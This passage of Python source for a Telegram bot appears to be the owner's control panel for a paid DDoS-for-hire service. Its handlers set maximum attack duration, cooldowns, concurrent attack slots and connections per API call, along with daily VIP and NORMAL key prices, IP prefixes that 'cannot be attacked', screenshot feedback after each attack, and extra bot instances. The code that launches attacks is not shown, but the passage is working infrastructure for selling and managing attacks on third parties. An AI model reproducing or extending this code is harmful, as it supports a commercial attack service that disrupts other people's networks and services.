            InlineKeyboardButton("🔙 Bᴀᴄᴋ", callback_data="config_back")
        )
        bot.edit_message_text(
            f"{pe('camera','📸')} <b>Fᴇᴇᴅʙᴀᴄᴋ RᴇQᴜɪʀᴇᴅ</b>\n\nCᴜʀʀᴇɴᴛ: {'🟢 RᴇQᴜɪʀᴇᴅ' if current else '🔴 Nᴏᴛ RᴇQᴜɪʀᴇᴅ'}\n\nWʜᴇɴ ᴇɴᴀʙʟᴇᴅ, ᴜꜱᴇʀꜱ ᴍᴜꜱᴛ ꜱᴇɴᴅ ᴀ ꜱᴄʀᴇᴇɴꜱʜᴏᴛ ᴀꜰᴛᴇʀ ᴇᴀᴄʜ ᴀᴛᴛᴀᴄᴋ.",
            call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML"
        )
    elif data == "config_vip_price":
        bot.edit_message_text(
            f"{pe('star','💰')} <b>VIP Pʀɪᴄɪɴɢ</b>\n\nSᴇɴᴅ ᴘʀɪᴄᴇꜱ ɪɴ ᴛʜɪꜱ ꜰᴏʀᴍᴀᴛ:\n<code>1d:80,2d:150,3d:200,7d:400,15d:800,30d:1500</code>\n\nCᴜʀʀᴇɴᴛ: " + str(get_setting('pricing_VIP', KEY_PRICING['VIP'])) + "\n\nTʏᴘᴇ /cancel ᴛᴏ ᴀʙᴏʀᴛ.",
            call.message.chat.id, call.message.message_id, parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, set_vip_pricing)
    elif data == "config_normal_price":
        bot.edit_message_text(
            f"{pe('star','💰')} <b>NORMAL Pʀɪᴄɪɴɢ</b>\n\nSᴇɴᴅ ᴘʀɪᴄᴇꜱ ɪɴ ᴛʜɪꜱ ꜰᴏʀᴍᴀᴛ:\n<code>1d:70,2d:130,3d:200,7d:300,15d:600,30d:1100</code>\n\nCᴜʀʀᴇɴᴛ: " + str(get_setting('pricing_NORMAL', KEY_PRICING['NORMAL'])) + "\n\nTʏᴘᴇ /cancel ᴛᴏ ᴀʙᴏʀᴛ.",
            call.message.chat.id, call.message.message_id, parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, set_normal_pricing)
    elif data == "config_group":
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("➕ Aᴅᴅ Gʀᴏᴜᴘ", callback_data="group_add"),
            InlineKeyboardButton("➖ Rᴇᴍᴏᴠᴇ Gʀᴏᴜᴘ", callback_data="group_remove"),
            InlineKeyboardButton("📋 Lɪꜱᴛ Gʀᴏᴜᴘꜱ", callback_data="group_list"),
            InlineKeyboardButton("🔙 Bᴀᴄᴋ", callback_data="config_back")
        )
        bot.edit_message_text(
            f"{pe('briefcase','👥')} <b>Gʀᴏᴜᴘ Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>\n\nSᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ:",
            call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML"
        )
    elif data == "config_bot":
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("➕ Aᴅᴅ Bᴏᴛ", callback_data="bot_add"),
            InlineKeyboardButton("➖ Rᴇᴍᴏᴠᴇ Bᴏᴛ", callback_data="bot_remove"),
            InlineKeyboardButton("📋 Lɪꜱᴛ Bᴏᴛꜱ", callback_data="bot_list"),
            InlineKeyboardButton("🔙 Bᴀᴄᴋ", callback_data="config_back")
        )
        bot.edit_message_text(
            f"{pe('gear','🤖')} <b>Bᴏᴛ Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>\n\nSᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ:",
            call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML"
        )
    elif data == "config_maintenance":
        current = is_maintenance()
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("🔧 Eɴᴀʙʟᴇ" if not current else "🔴 Aʟʀᴇᴀᴅʏ ON", callback_data="maint_on"),
            InlineKeyboardButton("✅ Dɪꜱᴀʙʟᴇ" if current else "⚪ Aʟʀᴇᴀᴅʏ OFF", callback_data="maint_of"),
            InlineKeyboardButton("🔙 Bᴀᴄᴋ", callback_data="config_back")
        )
        bot.edit_message_text(
            f"{pe('gear','🔧')} <b>Mᴀɪɴᴛᴇɴᴀɴᴄᴇ Mᴏᴅᴇ</b>\n\nCᴜʀʀᴇɴᴛ: {'🟢 Eɴᴀʙʟᴇᴅ' if current else '🔴 Dɪꜱᴀʙʟᴇᴅ'}\n\nWʜᴇɴ ᴇɴᴀʙʟᴇᴅ, ᴏɴʟʏ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜꜱᴇ ᴛʜᴇ ʙᴏᴛ.",
            call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML"
        )
    elif data == "config_view":
        busy_slots, free_slots, total_slots = get_slot_status()
        response = f"{pe('chart','📊')} <b>Cᴜʀʀᴇɴᴛ Sᴇᴛᴛɪɴɢꜱ</b>\n\n"
        response += f"{pe('gear','⚙️')} Mᴀx Aᴛᴛᴀᴄᴋ Tɪᴍᴇ: {get_max_attack_time()}ꜱ\n"
        response += f"{pe('hourglass','⏳')} Cᴏᴏʟᴅᴏᴡɴ: {get_user_cooldown_setting()}ꜱ\n"
        response += f"{pe('target','🎯')} Mᴀx Sʟᴏᴛꜱ: {total_slots} (Fʀᴇᴇ: {free_slots})\n"
        response += f"{pe('lightning','⚡')} Cᴏɴᴄᴜʀʀᴇɴᴛ Pᴇʀ Aᴛᴛᴀᴄᴋ: {get_concurrent_limit()}\n"
        response += f"{pe('gear','🔒')} Pᴏʀᴛ Pʀᴏᴛᴇᴄᴛɪᴏɴ: {'ON' if get_setting('port_protection', True) else 'OFF'}\n"
        response += f"{pe('camera','📸')} Fᴇᴇᴅʙᴀᴄᴋ RᴇQᴜɪʀᴇᴅ: {'ON' if get_setting('feedback_required', True) else 'OFF'}\n"
        response += f"{pe('gear','🔧')} Mᴀɪɴᴛᴇɴᴀɴᴄᴇ: {'ON' if is_maintenance() else 'OFF'}\n"
        response += f"{pe('warning','🚫')} Bʟᴏᴄᴋᴇᴅ IPꜱ: {len(get_all_blocked_ips())}\n"
        response += f"{pe('briefcase','👥')} Aᴘᴘʀᴏᴠᴇᴅ Gʀᴏᴜᴘꜱ: {approved_groups_collection.count_documents({})}\n"
        response += f"{pe('gear','🤖')} Aᴄᴛɪᴠᴇ Bᴏᴛꜱ: {len([b for b in get_all_bots() if b.get('active')])}\n"
        response += f"\n{pe('star','⭐')} VIP Mᴀx Aᴛᴛᴀᴄᴋ: {get_key_max_attack('VIP')}ꜱ\n"
        response += f"{pe('star','📀')} NORMAL Mᴀx Aᴛᴛᴀᴄᴋ: {get_key_max_attack('NORMAL')}ꜱ\n"
        bot.answer_callback_query(call.id)
        bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode="HTML")
    elif data == "config_back":
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
            InlineKeyboardButton("⚙️ Mᴀx Aᴛᴛᴀᴄᴋ Tɪᴍᴇ", callback_data="config_maxtime"),
            InlineKeyboardButton("⏳ Cᴏᴏʟᴅᴏᴡɴ", callback_data="config_cooldown"),
            InlineKeyboardButton("🎯 Mᴀx Sʟᴏᴛꜱ", callback_data="config_slots"),
            InlineKeyboardButton("⚡ Cᴏɴᴄᴜʀʀᴇɴᴛ/Aᴛᴛᴀᴄᴋ", callback_data="config_concurrent"),
            InlineKeyboardButton("🚫 Bʟᴏᴄᴋ IP", callback_data="config_blockip"),
            InlineKeyboardButton("✅ Uɴʙʟᴏᴄᴋ IP", callback_data="config_unblockip"),
            InlineKeyboardButton("📋 Bʟᴏᴄᴋᴇᴅ IPꜱ", callback_data="config_listip"),
            InlineKeyboardButton("🔒 Pᴏʀᴛ Pʀᴏᴛᴇᴄᴛɪᴏɴ", callback_data="config_portprotect"),
            InlineKeyboardButton("📸 Fᴇᴇᴅʙᴀᴄᴋ RᴇQᴜɪʀᴇᴅ", callback_data="config_feedback"),
            InlineKeyboardButton("💰 VIP Pʀɪᴄɪɴɢ", callback_data="config_vip_price"),
            InlineKeyboardButton("💰 NORMAL Pʀɪᴄɪɴɢ", callback_data="config_normal_price"),
            InlineKeyboardButton("👥 Gʀᴏᴜᴘ Sᴇᴛᴛɪɴɢꜱ", callback_data="config_group"),
            InlineKeyboardButton("🤖 Bᴏᴛ Sᴇᴛᴛɪɴɢꜱ", callback_data="config_bot"),
            InlineKeyboardButton("🔧 Mᴀɪɴᴛᴇɴᴀɴᴄᴇ", callback_data="config_maintenance"),
            InlineKeyboardButton("📊 Cᴜʀʀᴇɴᴛ Sᴇᴛᴛɪɴɢꜱ", callback_data="config_view")
        )
        bot.edit_message_text(
            f"{pe('gear','🔧')} <b>ᴄᴏɴꜰɪɢᴜʀᴀᴛɪᴏɴ ᴘᴀɴᴇʟ</b>\n\nSᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ ᴛᴏ ᴄᴏɴꜰɪɢᴜʀᴇ:",
            call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="HTML"
        )

def set_vip_pricing(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{pe('cross','❌')} Cᴀɴᴄᴇʟʟᴇᴅ!", parse_mode="HTML")
        return
    try:
        prices = {}
        parts = message.text.split(',')
        for part in parts:
            key, val = part.split(':')
            prices[key.strip()] = int(val.strip())
        set_setting('pricing_VIP', prices)
        bot.reply_to(message, f"{pe('check','✅')} VIP Pʀɪᴄɪɴɢ ᴜᴘᴅᴀᴛᴇᴅ!", parse_mode="HTML")
    except:
        bot.reply_to(message, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ꜰᴏʀᴍᴀᴛ! Usᴇ: 1d:80,2d:150,3d:200,7d:400,15d:800,30d:1500", parse_mode="HTML")

def set_normal_pricing(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{pe('cross','❌')} Cᴀɴᴄᴇʟʟᴇᴅ!", parse_mode="HTML")
        return
    try:
        prices = {}
        parts = message.text.split(',')
        for part in parts:
            key, val = part.split(':')
            prices[key.strip()] = int(val.strip())
        set_setting('pricing_NORMAL', prices)
        bot.reply_to(message, f"{pe('check','✅')} NORMAL Pʀɪᴄɪɴɢ ᴜᴘᴅᴀᴛᴇᴅ!", parse_mode="HTML")
    except:
        bot.reply_to(message, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ꜰᴏʀᴍᴀᴛ! Usᴇ: 1d:70,2d:130,3d:200,7d:300,15d:600,30d:1100", parse_mode="HTML")

def get_all_bots():
    return list(bots_collection.find())

def add_bot(token, owner_id, max_slots=1):
    try:
        test_bot = telebot.TeleBot(token)
        bot_info = test_bot.get_me()
        bot_id = bot_info.id
        
        bot_doc = {
            'token': token,
            'bot_id': bot_id,
            'owner_id': owner_id,
            'max_slots': max_slots,
            'active': True,
            'added_at': datetime.now()
        }
        
        bots_collection.update_one(
            {'bot_id': bot_id},
            {'$set': bot_doc},
            upsert=True
        )
        return True, bot_id
    except Exception as e:
        return False, str(e)

def delete_bot(bot_input):
    try:
        if bot_input.isdigit():
            result = bots_collection.delete_one({'bot_id': int(bot_input)})
        else:
            result = bots_collection.delete_one({'token': bot_input})
        
        if result.deleted_count > 0:
            return True, "Bot deleted"
        else:
            return False, "Bot not found"
    except Exception as e:
        return False, str(e)

def get_bot_config(bot_token):
    return bots_collection.find_one({'token': bot_token})

def start_bot_instance(bot_config):
    if bot_config['bot_id'] in bot_threads and bot_threads[bot_config['bot_id']].is_alive():
        return
    
    def run_bot():
        try:
            instance_bot = telebot.TeleBot(bot_config['token'])
            active_bots[bot_config['bot_id']] = instance_bot
            instance_bot.infinity_polling(timeout=20, long_polling_timeout=20)
        except Exception as e:
            print(f"Bᴏᴛ {bot_config['bot_id']} ᴇʀʀᴏʀ: {e}")
    
    thread = threading.Thread(target=run_bot, daemon=True)
    thread.start()
    bot_threads[bot_config['bot_id']] = thread

def load_all_bots():
    all_bots = list(bots_collection.find({'active': True}))
    for bot_config in all_bots:
        start_bot_instance(bot_config)

@bot.callback_query_handler(func=lambda call: call.data in ["portprotect_on", "portprotect_of", "feedback_on", "feedback_of", "maint_on", "maint_of", "group_add", "group_remove", "group_list", "bot_add", "bot_remove", "bot_list"])
def action_callbacks(call):
    user_id = call.from_user.id
    
    if not is_owner(user_id):
        bot.answer_callback_query(call.id, "❌ Oɴʟʏ ᴏᴡɴᴇʀ ᴄᴀɴ ᴅᴏ ᴛʜɪꜱ!")
        return
    
    if call.data == "portprotect_on":
        set_setting('port_protection', True)
        bot.answer_callback_query(call.id, "✅ Pᴏʀᴛ Pʀᴏᴛᴇᴄᴛɪᴏɴ Eɴᴀʙʟᴇᴅ!")
        bot.edit_message_text(f"{pe('check','✅')} Pᴏʀᴛ Pʀᴏᴛᴇᴄᴛɪᴏɴ ʜᴀꜱ ʙᴇᴇɴ Eɴᴀʙʟᴇᴅ!", call.message.chat.id, call.message.message_id, parse_mode="HTML")
    elif call.data == "portprotect_of":
        set_setting('port_protection', False)
        bot.answer_callback_query(call.id, "✅ Pᴏʀᴛ Pʀᴏᴛᴇᴄᴛɪᴏɴ Dɪꜱᴀʙʟᴇᴅ!")
        bot.edit_message_text(f"{pe('check','✅')} Pᴏʀᴛ Pʀᴏᴛᴇᴄᴛɪᴏɴ ʜᴀꜱ ʙᴇᴇɴ Dɪꜱᴀʙʟᴇᴅ!", call.message.chat.id, call.message.message_id, parse_mode="HTML")
    elif call.data == "feedback_on":
        set_setting('feedback_required', True)
        bot.answer_callback_query(call.id, "✅ Fᴇᴇᴅʙᴀᴄᴋ RᴇQᴜɪʀᴇᴅ Eɴᴀʙʟᴇᴅ!")
        bot.edit_message_text(f"{pe('check','✅')} Fᴇᴇᴅʙᴀᴄᴋ RᴇQᴜɪʀᴇᴅ ʜᴀꜱ ʙᴇᴇɴ Eɴᴀʙʟᴇᴅ!", call.message.chat.id, call.message.message_id, parse_mode="HTML")
    elif call.data == "feedback_of":
        set_setting('feedback_required', False)
        bot.answer_callback_query(call.id, "✅ Fᴇᴇᴅʙᴀᴄᴋ RᴇQᴜɪʀᴇᴅ Dɪꜱᴀʙʟᴇᴅ!")
        bot.edit_message_text(f"{pe('check','✅')} Fᴇᴇᴅʙᴀᴄᴋ RᴇQᴜɪʀᴇᴅ ʜᴀꜱ ʙᴇᴇɴ Dɪꜱᴀʙʟᴇᴅ!", call.message.chat.id, call.message.message_id, parse_mode="HTML")
    elif call.data == "maint_on":
        set_maintenance(True, "Bᴏᴛ ɪꜱ ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. Pʟᴇᴀꜱᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ.")
        bot.answer_callback_query(call.id, "🔧 Mᴀɪɴᴛᴇɴᴀɴᴄᴇ Mᴏᴅᴇ Eɴᴀʙʟᴇᴅ!")
        bot.edit_message_text(f"{pe('gear','🔧')} Mᴀɪɴᴛᴇɴᴀɴᴄᴇ Mᴏᴅᴇ ʜᴀꜱ ʙᴇᴇɴ Eɴᴀʙʟᴇᴅ!", call.message.chat.id, call.message.message_id, parse_mode="HTML")
    elif call.data == "maint_of":
        set_maintenance(False)
        bot.answer_callback_query(call.id, "✅ Mᴀɪɴᴛᴇɴᴀɴᴄᴇ Mᴏᴅᴇ Dɪꜱᴀʙʟᴇᴅ!")
        bot.edit_message_text(f"{pe('check','✅')} Mᴀɪɴᴛᴇɴᴀɴᴄᴇ Mᴏᴅᴇ ʜᴀꜱ ʙᴇᴇɴ Dɪꜱᴀʙʟᴇᴅ!", call.message.chat.id, call.message.message_id, parse_mode="HTML")
    elif call.data == "group_add":
        bot.edit_message_text(
            f"{pe('plus','➕')} <b>Aᴅᴅ Gʀᴏᴜᴘ</b>\n\nSᴇɴᴅ: `/addgrp <ɴᴀᴍᴇ> <ɢʀᴏᴜᴘ_ɪᴅ> <ᴅᴀʏꜱ>`\n\nExᴀᴍᴘʟᴇ: `/addgrp Tᴇꜱᴛɢʀᴏᴜᴘ -100123456789 30`\n\nTʏᴘᴇ /cancel ᴛᴏ ᴀʙᴏʀᴛ.",
            call.message.chat.id, call.message.message_id, parse_mode="Markdown"
        )
    elif call.data == "group_remove":
        bot.edit_message_text(
            f"{pe('cross','➖')} <b>Rᴇᴍᴏᴠᴇ Gʀᴏᴜᴘ</b>\n\nSᴇɴᴅ: `/delgrp <ɴᴀᴍᴇ>`\n\nUsᴇ `/grpinfo` ᴛᴏ ꜱᴇᴇ ɢʀᴏᴜᴘ ɴᴀᴍᴇꜱ.\n\nTʏᴘᴇ /cancel ᴛᴏ ᴀʙᴏʀᴛ.",
            call.message.chat.id, call.message.message_id, parse_mode="Markdown"
        )
    elif call.data == "group_list":
        groups = list(approved_groups_collection.find())
        if not groups:
            response = "📋 Nᴏ ᴀᴘᴘʀᴏᴠᴇᴅ ɢʀᴏᴜᴘꜱ ꜰᴏᴜɴᴅ!"
        else:
            response = f"{pe('briefcase','👥')} <b>Aᴘᴘʀᴏᴠᴇᴅ Gʀᴏᴜᴘꜱ</b>\n\n"
            for i, group in enumerate(groups, 1):
                status = f"{pe('check','✅')} Aᴄᴛɪᴠᴇ" if not group.get('expiry_date') or group['expiry_date'] > datetime.now() else f"{pe('cross','🔴')} Exᴘɪʀᴇᴅ"
                response += f"{i}. <b>{group.get('name', 'Unknown')}</b>\n"
                response += f"   {pe('target','📱')} Gʀᴏᴜᴘ ID: <code>{group['group_id']}</code>\n"
                response += f"   {pe('chart','📊')} Sᴛᴀᴛᴜꜱ: {status}\n"
                response += f"   {pe('gear','⚙️')} Mᴀx Tɪᴍᴇ: {group.get('max_attack_time', get_max_attack_time())}ꜱ\n"
                response += f"   {pe('target','🎯')} Mᴀx Sʟᴏᴛꜱ: {group.get('max_slots', current_max_slots)}\n"
                response += f"   {pe('hourglass','⏳')} Cᴏᴏʟᴅᴏᴡɴ: {group.get('cooldown', get_user_cooldown_setting())}ꜱ\n"
                response += f"   {pe('camera','📸')} Fᴇᴇᴅʙᴀᴄᴋ RᴇQᴜɪʀᴇᴅ: {'ON' if group.get('feedback_required', get_setting('feedback_required', True)) else 'OFF'}\n"
                if group.get('expiry_date'):
                    response += f"   {pe('calendar','📅')} Exᴘɪʀᴇꜱ: {group['expiry_date'].strftime('%d-%m-%Y')}\n"
                response += "\n"
        bot.answer_callback_query(call.id)
        bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode="HTML")
    elif call.data == "bot_add":
        bot.edit_message_text(
            f"{pe('plus','➕')} <b>Aᴅᴅ Bᴏᴛ</b>\n\nSᴇɴᴅ ᴛʜᴇ ʙᴏᴛ ᴛᴏᴋᴇɴ:\n\nExᴀᴍᴘʟᴇ: <code>1234567890:ABCᴅᴇꜰGʜɪᴊᴋʟMɴᴏᴘQʀꜱTUVᴡxʏᴢ</code>\n\nTʏᴘᴇ /cancel ᴛᴏ ᴀʙᴏʀᴛ.",
            call.message.chat.id, call.message.message_id, parse_mode="HTML"
        )
        bot.register_next_step_handler(call.message, get_bot_token)
    elif call.data == "bot_remove":
        bots = get_all_bots()
        if not bots:
            bot.edit_message_text("📋 Nᴏ ʙᴏᴛꜱ ꜰᴏᴜɴᴅ!", call.message.chat.id, call.message.message_id)
        else:
            bot_list = f"{pe('gear','🤖')} <b>Aᴄᴛɪᴠᴇ Bᴏᴛꜱ:</b>\n\n"
            for b in bots:
                bot_list += f"★ ID: <code>{b['bot_id']}</code> | Aᴄᴛɪᴠᴇ: {'✅' if b.get('active') else '❌'}\n"
            bot_list += "\nSᴇɴᴅ ᴛʜᴇ Bᴏᴛ ID ᴏʀ Tᴏᴋᴇɴ ᴛᴏ ᴅᴇʟᴇᴛᴇ:\nTʏᴘᴇ /cancel ᴛᴏ ᴀʙᴏʀᴛ."
            bot.edit_message_text(bot_list, call.message.chat.id, call.message.message_id, parse_mode="HTML")
            bot.register_next_step_handler(call.message, process_del_bot)
    elif call.data == "bot_list":
        bots = get_all_bots()
        if not bots:
            response = "📋 Nᴏ ʙᴏᴛꜱ ꜰᴏᴜɴᴅ!"
        else:
            response = f"{pe('gear','🤖')} <b>Aʟʟ Bᴏᴛꜱ</b>\n\n"
            for b in bots:
                status = f"{pe('check','🟢')} Rᴜɴɴɪɴɢ" if b.get('active') else f"{pe('cross','🔴')} Sᴛᴏᴘᴘᴇᴅ"
                response += f"<b>Bᴏᴛ ID:</b> <code>{b['bot_id']}</code>\n"
                response += f"<b>Sᴛᴀᴛᴜꜱ:</b> {status}\n"
                response += f"<b>Oᴡɴᴇʀ:</b> {b['owner_id']}\n"
                response += f"<b>Sʟᴏᴛꜱ:</b> {b.get('max_slots', 1)}\n"
                response += "──────────────────\n"
        bot.answer_callback_query(call.id)
        bot.edit_message_text(response, call.message.chat.id, call.message.message_id, parse_mode="HTML")

def set_max_time_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{pe('cross','❌')} Cᴀɴᴄᴇʟʟᴇᴅ!", parse_mode="HTML")
        return
    
    try:
        value = int(message.text.strip())
        if value < MIN_ATTACK_TIME:
            bot.reply_to(message, f"{pe('cross','❌')} Vᴀʟᴜᴇ ᴍᴜꜱᴛ ʙᴇ ᴀᴛ ʟᴇᴀꜱᴛ {MIN_ATTACK_TIME} ꜱᴇᴄᴏɴᴅꜱ!", parse_mode="HTML")
            return
        set_setting('max_attack_time', value)
        bot.reply_to(message, f"{pe('check','✅')} Mᴀx Aᴛᴛᴀᴄᴋ Tɪᴍᴇ ꜱᴇᴛ ᴛᴏ {value} ꜱᴇᴄᴏɴᴅꜱ!", parse_mode="HTML")
    except:
        bot.reply_to(message, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!", parse_mode="HTML")

def set_cooldown_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{pe('cross','❌')} Cᴀɴᴄᴇʟʟᴇᴅ!", parse_mode="HTML")
        return
    
    try:
        value = int(message.text.strip())
        if value < 0:
            bot.reply_to(message, f"{pe('cross','❌')} Cᴏᴏʟᴅᴏᴡɴ ᴄᴀɴɴᴏᴛ ʙᴇ ɴᴇɢᴀᴛɪᴠᴇ!", parse_mode="HTML")
            return
        set_setting('user_cooldown', value)
        bot.reply_to(message, f"{pe('check','✅')} Cᴏᴏʟᴅᴏᴡɴ ꜱᴇᴛ ᴛᴏ {value} ꜱᴇᴄᴏɴᴅꜱ!", parse_mode="HTML")
    except:
        bot.reply_to(message, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!", parse_mode="HTML")

def set_slots_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{pe('cross','❌')} Cᴀɴᴄᴇʟʟᴇᴅ!", parse_mode="HTML")
        return
    
    try:
        global current_max_slots
        value = int(message.text.strip())
        if value < 1:
            value = 1
        if value > 50:
            value = 50
        current_max_slots = value
        set_setting('max_concurrent_slots', value)
        bot.reply_to(message, f"{pe('check','✅')} Mᴀx ꜱʟᴏᴛꜱ ꜱᴇᴛ ᴛᴏ {value}!\n\nNᴏᴡ {value} ᴀᴛᴛᴀᴄᴋꜱ ᴄᴀɴ ʀᴜɴ ꜱɪᴍᴜʟᴛᴀɴᴇᴏᴜꜱʟʏ.", parse_mode="HTML")
    except:
        bot.reply_to(message, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!", parse_mode="HTML")

def set_concurrent_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{pe('cross','❌')} Cᴀɴᴄᴇʟʟᴇᴅ!", parse_mode="HTML")
        return
    
    try:
        value = int(message.text.strip())
        if value < 1:
            value = 1
        if value > 50:
            value = 50
        set_concurrent_limit(value)
        bot.reply_to(message, f"{pe('check','✅')} Cᴏɴᴄᴜʀʀᴇɴᴛ ᴘᴇʀ ᴀᴛᴛᴀᴄᴋ ꜱᴇᴛ ᴛᴏ {value}!\n\nEᴀᴄʜ API ᴄᴀʟʟ ᴡɪʟʟ ᴜꜱᴇ {value} ᴄᴏɴᴄᴜʀʀᴇɴᴛ ᴄᴏɴɴᴇᴄᴛɪᴏɴꜱ.", parse_mode="HTML")
    except:
        bot.reply_to(message, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ɴᴜᴍʙᴇʀ!", parse_mode="HTML")

def block_ip_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{pe('cross','❌')} Cᴀɴᴄᴇʟʟᴇᴅ!", parse_mode="HTML")
        return
    
    ip_prefix = message.text.strip()
    
    if add_blocked_ip(ip_prefix):
        bot.reply_to(message, f"{pe('check','✅')} IP ᴘʀᴇꜰɪx <code>{ip_prefix}*</code> ʜᴀꜱ ʙᴇᴇɴ ʙʟᴏᴄᴋᴇᴅ!\n\nAɴʏ IP ꜱᴛᴀʀᴛɪɴɢ ᴡɪᴛʜ {ip_prefix} ᴄᴀɴɴᴏᴛ ʙᴇ ᴀᴛᴛᴀᴄᴋᴇᴅ.", parse_mode="HTML")
    else:
        bot.reply_to(message, f"{pe('cross','❌')} Fᴀɪʟᴇᴅ ᴛᴏ ʙʟᴏᴄᴋ IP!", parse_mode="HTML")

def unblock_ip_config(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{pe('cross','❌')} Cᴀɴᴄᴇʟʟᴇᴅ!", parse_mode="HTML")
        return
    
    ip_prefix = message.text.strip()
    
    if remove_blocked_ip(ip_prefix):
        bot.reply_to(message, f"{pe('check','✅')} IP ᴘʀᴇꜰɪx <code>{ip_prefix}*</code> ʜᴀꜱ ʙᴇᴇɴ ᴜɴʙʟᴏᴄᴋᴇᴅ!", parse_mode="HTML")
    else:
        bot.reply_to(message, f"{pe('cross','❌')} IP ᴘʀᴇꜰɪx <code>{ip_prefix}*</code> ɴᴏᴛ ꜰᴏᴜɴᴅ ɪɴ ʙʟᴏᴄᴋᴇᴅ ʟɪꜱᴛ!", parse_mode="HTML")

def get_bot_token(message):
    if message.text == "/cancel":
        bot.reply_to(message, f"{pe('cross','❌')} Oᴘᴇʀᴀᴛɪᴏɴ ᴄᴀɴᴄᴇʟʟᴇᴅ!", parse_mode="HTML")
        return
    
    bot_token = message.text.strip()
    
    if ":" in bot_token:
        try:
            test_bot = telebot.TeleBot(bot_token)
            bot_info = test_bot.get_me()
            bot_id = bot_info.id
            
            bot.reply_to(message, f"{pe('check','✅')} Bᴏᴛ ɪᴅᴇɴᴛɪꜰɪᴇᴅ: <b>{bot_info.first_name}</b> (@{bot_info.username})\n\nSᴇɴᴅ ᴛʜᴇ <b>Aᴅᴍɪɴ/Oᴡɴᴇʀ ID</b> ꜰᴏʀ ᴛʜɪꜱ ʙᴏᴛ:", parse_mode="HTML")
            bot.register_next_step_handler(message, lambda m: get_bot_admin(m, bot_token, bot_id))
        except Exception as e:
            bot.reply_to(message, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ᴛᴏᴋᴇɴ! Eʀʀᴏʀ: {str(e)}\n\nUsᴇ /addbot ᴛᴏ ᴛʀʏ ᴀɢᴀɪɴ.", parse_mode="HTML")
    else:
        bot.reply_to(message, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ᴛᴏᴋᴇɴ ꜰᴏʀᴍᴀᴛ!\n\nUsᴇ /addbot ᴛᴏ ᴛʀʏ ᴀɢᴀɪɴ.", parse_mode="HTML")

def get_bot_admin(message, bot_token, bot_id):
    if message.text == "/cancel":
        bot.reply_to(message, f"{pe('cross','❌')} Oᴘᴇʀᴀᴛɪᴏɴ ᴄᴀɴᴄᴇʟʟᴇᴅ!", parse_mode="HTML")
        return
    
    try:
        admin_id = int(message.text.strip())
        
        bot.reply_to(message, f"{pe('gear','⚙️')} <b>Mᴀx Sʟᴏᴛꜱ</b>\n\nHᴏᴡ ᴍᴀɴʏ ᴄᴏɴᴄᴜʀʀᴇɴᴛ ᴀᴛᴛᴀᴄᴋꜱ ᴄᴀɴ ᴛʜɪꜱ ʙᴏᴛ ʜᴀɴᴅʟᴇ?\n\nSᴇɴᴅ ᴀ ɴᴜᴍʙᴇʀ (1-10):", parse_mode="HTML")
        bot.register_next_step_handler(message, lambda m: get_bot_slots(m, bot_token, bot_id, admin_id))
    except:
        bot.reply_to(message, f"{pe('cross','❌')} Iɴᴠᴀʟɪᴅ ID! Sᴇɴᴅ ᴀ ɴᴜᴍᴇʀɪᴄ ID.\n\nUsᴇ /addbot ᴛᴏ ᴛʀʏ ᴀɢᴀɪɴ.", parse_mode="HTML")

def get_bot_slots(message, bot_token, bot_id, admin_id):
    if message.text == "/cancel":
        bot.reply_to(message, f"{pe('cross','❌')} Oᴘᴇʀᴀᴛɪᴏɴ ᴄᴀɴᴄᴇʟʟᴇᴅ!", parse_mode="HTML")
        return
    
    try:
        max_slots = int(message.text.strip())
        if max_slots < 1:
            max_slots = 1
        if max_slots > 10:
            max_slots = 10
        
        success, result = add_bot(bot_token, admin_id, max_slots)
        
        if success:
            bot_config = get_bot_config(bot_token)
            if bot_config:
                start_bot_instance(bot_config)
            
            bot.reply_to(message, f"{pe('check','✅')} <b>Bᴏᴛ Aᴅᴅᴇᴅ Sᴜᴄᴄᴇꜱꜰᴜʟʟʏ!</b>\n\n{pe('gear','🤖')} Bᴏᴛ ID: <code>{result}</code>\n{pe('crown','👑')} Oᴡɴᴇʀ ID: {admin_id}\n{pe('gear','⚙️')} Mᴀx Sʟᴏᴛꜱ: {max_slots}\n\nBᴏᴛ ɪꜱ ɴᴏᴡ ʀᴜɴɴɪɴɢ!", parse_mode="HTML")
        else:
